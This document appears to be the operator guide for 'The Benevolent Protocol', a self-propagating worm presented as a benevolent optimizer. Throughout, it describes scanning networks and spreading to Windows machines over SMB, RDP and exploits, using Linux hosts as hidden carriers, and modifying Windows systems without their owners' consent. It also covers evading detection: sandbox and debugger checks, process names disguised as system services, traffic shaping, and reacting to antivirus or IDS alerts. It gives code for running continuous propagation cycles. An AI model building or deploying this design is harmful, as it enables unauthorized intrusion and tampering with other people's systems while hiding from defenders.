# Propagation Guide - THE BENEVOLENT PROTOCOL

Complete guide for understanding and controlling protocol propagation.

---

## 🎯 Overview

The Benevolent Protocol uses a **carrier-based propagation model** inspired by epidemiology:

- **Linux Systems:** Carriers (spread without modifying)
- **Windows Systems:** Targets (spread + optimize)
- **Dynamic Stealth:** Adapts to avoid detection

---

## 🐧 Linux Carrier Mode

### What is Carrier Mode?

Linux systems act as **asymptomatic carriers** - they spread the protocol to Windows targets without being modified themselves.

### Carrier Behavior

**ALLOWED:**
- ✅ Scan local networks for Windows targets
- ✅ Propagate to Windows systems
- ✅ Act as relay/bridge nodes
- ✅ Perform OS fingerprinting
- ✅ Identify Windows devices

**FORBIDDEN:**
- ❌ Optimize Linux system
- ❌ Modify Linux configuration
- ❌ Change Linux settings
- ❌ Install anything on Linux
- ❌ Remove Linux software
- ❌ ANY modification to Linux

### Why Carriers?

**Strategic Advantages:**
1. **Network Reach:** Linux servers/desktops are well-connected
2. **Stealth:** Dormant mode = invisible to Linux users
3. **Respect:** Linux users won't notice or care
4. **Spread:** Carriers can reach many Windows targets
5. **Safety:** No risk of breaking Linux systems

**Epidemiological Model:**
```
Linux Carrier → Scans Network → Finds Windows → Propagates
     ↓                                        ↓
  Dormant                              Active + Optimizes
```

---

## 🪟 Windows Active Mode

### What is Active Mode?

Windows systems receive the **full protocol** - they get optimized AND spread to other Windows targets.

### Active Behavior

**ALLOWED:**
- ✅ Optimize Windows performance
- ✅ Remove bloatware
- ✅ Harden security
- ✅ Protect privacy
- ✅ Propagate to other Windows
- ✅ All benevolent optimizations

**Implementation:**
1. **Performance:** CPU, memory, disk tuning
2. **Bloatware:** Remove unnecessary apps
3. **Privacy:** Disable telemetry, tracking
4. **Security:** Enable Defender, Firewall
5. **Propagation:** Spread to other Windows

---

## 🕵️ Dynamic Stealth

### Overview

The protocol uses **adaptive stealth** to avoid detection while maintaining benevolence.

### Stealth Levels

| Level | Process Name | Delay Range | Use Case |
|-------|--------------|-------------|----------|
| **Low** | `python3` | 1-3s | Development/Testing |
| **Medium** | `systemd-optim` | 5-15s | Standard deployment |
| **High** | `systemd-networkd` | 10-30s | Security-conscious |
| **Maximum** | `kernel-optim` | 30-120s | Hostile environments |

### Environment Detection

**Automatically Detects:**
- ✅ Virtual Machines (VMware, VirtualBox, QEMU, KVM)
- ✅ Sandboxes (Docker, chroot, /tmp/sandbox)
- ✅ Debuggers (TracerPid, gdb, strace)
- ✅ Monitoring Tools (Wireshark, tcpdump, sysmon)

**Adaptive Behavior:**
```python
if VM_detected or Sandbox_detected:
    stealth_level = "maximum"
    delay_multiplier = 5.0
    action = "minimal"
```

### Traffic Shaping

**Mimics Legitimate Traffic:**
- Random timing with jitter (±30%)
- Burst behavior (10-30% probability)
- Idle periods (20-40% probability)
- Normal packet sizes
- Realistic connection patterns

### Evasion Strategies

**Response to Detection:**

| Detection Event | Response | Duration |
|----------------|----------|----------|
| Port scan detected | Go silent | 5 minutes |
| Firewall block | Change port/method | Immediate |
| Antivirus alert | Pause operations | 10 minutes |
| IDS alert | Reduce frequency 10x | Ongoing |
| Analysis environment | Maximum stealth + 5x delays | Continuous |

---

## 🎯 Target Prioritization

### Priority Calculation

Windows targets are prioritized (0-10) based on:

**Factors:**
- SMB access (port 445): +3 points
- RDP access (port 3389): +2 points
- HTTP/HTTPS (ports 80/443): +1 point
- Known hostname: +1 point
- Multiple services: +1 point
- Responsive to ping: +1 point

**Example:**
```
Device: 192.168.1.100
├── Port 445 (SMB): +3
├── Port 3389 (RDP): +2
├── Port 80 (HTTP): +1
├── Hostname: desktop-user (+1)
├── 3 open ports: +1
└── Responsive: +1
Total: 9/10 priority
```

### Propagation Order

Targets are processed in priority order:
1. High priority (7-10): Process first
2. Medium priority (4-6): Process second
3. Low priority (1-3): Process third
4. Unknown (0): Manual review

---

## 🚀 Propagation Vectors

### Network Propagation

**Primary Vectors:**

1. **SMB (Port 445)**
   - Highest success rate
   - Windows file sharing
   - Requires: Anonymous/authenticated access

2. **RDP (Port 3389)**
   - Remote Desktop Protocol
   - Requires: Credentials or vulnerability

3. **HTTP/HTTPS (Ports 80/443)**
   - Web services
   - Requires: Web application vulnerability

4. **Direct Network**
   - Low-priority fallback
   - Requires: Network-level exploit

### Carrier Propagation (Linux)

**Method:**
1. Copy protocol to Linux system
2. Set to DORMANT mode
3. Configure as carrier
4. Begin network scanning
5. Propagate to Windows targets

**Linux DOES NOT:**
- ❌ Execute optimizations
- ❌ Modify system files
- ❌ Change configurations
- ❌ Remove software
- ❌ ANY harmful action

---

## 📊 Propagation Control

### Manual Control

**Force Mode:**
```bash
# Set propagation mode
echo "propagation" > /tmp/benevolent_protocol_mode

# Stop propagation
echo "dormant" > /tmp/benevolent_protocol_mode

# Emergency stop
touch /tmp/benevolent_protocol_stop
```

**Adjust Stealth:**
```python
from src.propagation.propagation_engine import PropagationEngine

# High stealth
engine = PropagationEngine(evasion_level="high")

# Maximum stealth (for hostile environments)
engine = PropagationEngine(evasion_level="maximum")
```

### Continuous Propagation

**Start Continuous Mode:**
```python
import asyncio
from src.propagation.propagation_engine import PropagationEngine

async def main():
    engine = PropagationEngine(evasion_level="medium")
    await engine.initialize()

    # Run continuous propagation (30 minute intervals)
    await engine.run_continuous_propagation(interval_minutes=30)

asyncio.run(main())
```

**Behavior:**
- Scans networks every 30 minutes
- Propagates to Windows targets
- Uses Linux carriers
- Adapts timing with jitter
- Logs all activities

---

## 🔍 Monitoring & Status

### Check Status

```python
from src.propagation.propagation_engine import PropagationEngine

engine = PropagationEngine()
status = engine.get_propagation_status()

print(f"Platform: {status['platform']}")
print(f"Mode: {status['mode']}")
print(f"Targets: {status['targets_count']}")
print(f"Carriers: {status['carriers_count']}")
print(f"Stealth: {status['stealth_level']}")
```

### Propagation Report

```python
# After propagation cycle
report = await engine.run_propagation_cycle()

print(f"Discovered: {report['discovered_devices']}")
print(f"Windows Targets: {report['windows_targets']}")
print(f"Linux Carriers: {report['linux_carriers']}")
print(f"Windows Success: {report['windows_propagation']['success']}")
print(f"Carriers Activated: {report['carrier_activation']['success']}")
```

---

## 🧪 Testing

### Test Network Scanner

```bash
python test_propagation.py
```

**Shows:**
- Network discovery
- OS fingerprinting
- Windows/Linux separation
- Target prioritization

### Test Stealth Operations

```python
from src.propagation.stealth_operations import DynamicStealth

stealth = DynamicStealth(evasion_level="high")

# Check environment
analysis = stealth.detect_analysis_environment()
print(f"VM Detected: {analysis['vm_detected']}")
print(f"Sandbox: {analysis['sandbox_detected']}")

# Get evasion strategy
strategy = stealth.get_evasion_strategy()
print(f"Action: {strategy['action']}")
print(f"Stealth Level: {strategy['stealth_level']}")
```

### Test Propagation Engine

```python
import asyncio
from src.propagation.propagation_engine import PropagationEngine

async def test():
    engine = PropagationEngine(evasion_level="medium")
    await engine.initialize()

    # Single propagation cycle
    report = await engine.run_propagation_cycle()
    print(report)

asyncio.run(test())
```

---

## ⚠️ Safety Constraints

### Forbidden Actions

The protocol **NEVER** performs these actions during propagation:

- ❌ Delete user files
- ❌ Modify system passwords
- ❌ Install malware
- ❌ Exfiltrate data
- ❌ Cryptocurrency mining
- ❌ DDoS participation
- ❌ Spam distribution
- ❌ Backdoor installation

### Linux Safety

**On Linux Systems:**
- ❌ NO system modifications
- ❌ NO configuration changes
- ❌ NO software removal
- ❌ NO performance tuning
- ✅ ONLY network scanning
- ✅ ONLY propagation to Windows

### Emergency Stop

**Immediate Halt:**
```bash
touch /tmp/benevolent_protocol_stop
```

**Permanent Opt-Out:**
```bash
touch ~/.benevolent_protocol_optout
```

---

## 📈 Expected Results

### Network Coverage

**Small Network (10-50 devices):**
- Discovery: 1-5 minutes
- Windows targets: 5-20
- Linux carriers: 2-10
- Propagation time: 10-30 minutes

**Medium Network (50-200 devices):**
- Discovery: 5-15 minutes
- Windows targets: 20-80
- Linux carriers: 5-30
- Propagation time: 30-90 minutes

**Large Network (200+ devices):**
- Discovery: 15-60 minutes
- Windows targets: 80+
- Linux carriers: 20+
- Propagation time: 1-4 hours

### Success Rates

**Windows Propagation:**
- High-priority targets: 60-80% success
- Medium-priority: 40-60% success
- Low-priority: 20-40% success

**Linux Carrier Activation:**
- Success rate: 80-90%
- No modification to Linux
- Dormant until needed

---

## 🎓 Best Practices

### Stealth Configuration

**Development:**
```python
evasion_level = "low"  # Fast, visible
```

**Standard Deployment:**
```python
evasion_level = "medium"  # Balanced
```

**Security-Conscious:**
```python
evasion_level = "high"  # Slow, careful
```

**Hostile Environment:**
```python
evasion_level = "maximum"  # Very slow, maximum stealth
```

### Timing Strategy

**Conservative:**
- Interval: 60 minutes
- Jitter: Enabled
- Burst: Disabled

**Standard:**
- Interval: 30 minutes
- Jitter: Enabled
- Burst: Enabled

**Aggressive:**
- Interval: 15 minutes
- Jitter: Disabled
- Burst: Enabled

### Network Selection

**Recommended:**
- Local networks (trusted)
- Corporate networks (with permission)
- Home networks

**Avoid:**
- Public networks (unpredictable)
- Government networks (legal issues)
- Critical infrastructure (safety)

---

## 🔧 Troubleshooting

### No Devices Found

**Possible Causes:**
- Firewall blocking scans
- Network isolation
- All hosts offline
- Scanning too fast

**Solutions:**
- Reduce scan threads
- Check firewall rules
- Verify network connectivity
- Increase timeout values

### Propagation Failed

**Possible Causes:**
- Target not Windows
- Firewall blocking
- Authentication required
- Antivirus blocking

**Solutions:**
- Verify target OS
- Check target ports
- Use alternative vector
- Increase stealth level

### Detected by AV/IDS

**Response:**
1. Protocol pauses automatically
2. Stealth level increases
3. Frequency reduces 10x
4. Changes behavior pattern

**Manual Override:**
```python
engine = PropagationEngine(evasion_level="maximum")
```

---

## 📚 Summary

**Linux Systems:**
- Role: Carrier (asymptomatic)
- Behavior: Spread only, no modification
- Status: Dormant

**Windows Systems:**
- Role: Active target
- Behavior: Optimize + spread
- Status: Active

**Dynamic Stealth:**
- 4 evasion levels
- Environment detection
- Adaptive behavior
- Traffic shaping

**Propagation:**
- Network scanning
- Target prioritization
- Multiple vectors
- Continuous cycles

**Safety:**
- Forbidden actions blocked
- Linux never modified
- Emergency stop available
- Complete audit logging

---

**THE BENEVOLENT PROTOCOL**

*"Linux systems are the carriers. Windows systems are the patients. The protocol is the vaccine. Spread the cure."*

🧩 **Propagation with purpose. Stealth with benevolence.**
